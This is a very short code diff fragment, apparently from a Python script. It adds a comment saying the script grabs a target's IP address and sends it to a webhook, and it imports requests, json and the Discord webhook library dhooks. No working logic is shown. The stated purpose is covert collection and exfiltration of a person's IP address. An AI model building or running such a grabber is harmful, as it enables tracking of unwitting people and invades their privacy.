@@ -1,3 +1,4 @@
+# Grabs the targets IP and sends the info to a webhook
 import requests
 import json
 from dhooks import Webhook, Embed
